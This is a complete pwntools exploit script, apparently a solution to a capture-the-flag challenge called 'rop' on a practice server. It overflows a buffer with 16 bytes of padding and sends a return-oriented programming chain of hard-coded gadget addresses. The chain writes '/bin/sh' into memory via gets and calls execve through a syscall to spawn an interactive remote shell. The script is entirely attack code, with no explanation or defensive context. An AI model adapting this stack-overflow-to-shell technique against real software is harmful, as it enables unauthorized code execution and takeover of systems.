#!/usr/bin/env python3
from pwn import *

#r = process('./rop')
r = remote("hackme.inndy.tw", 7704)

pop_eax = 0x080b8016
pop_ebx = 0x080481c9
pop_ecx = 0x080de769
pop_edx = 0x0806ecda
gets = 0x804f0d0
sh_address = 0x080ecf00
syscall = 0x0806c943

payload = flat([
    gets, pop_eax, sh_address,
    pop_eax, 0x0b, pop_ebx, sh_address, pop_ecx, 0, pop_edx, 0, syscall
])

r.sendline(b'A' * 16 + payload)
r.sendline("/bin/sh\x00")

r.interactive()
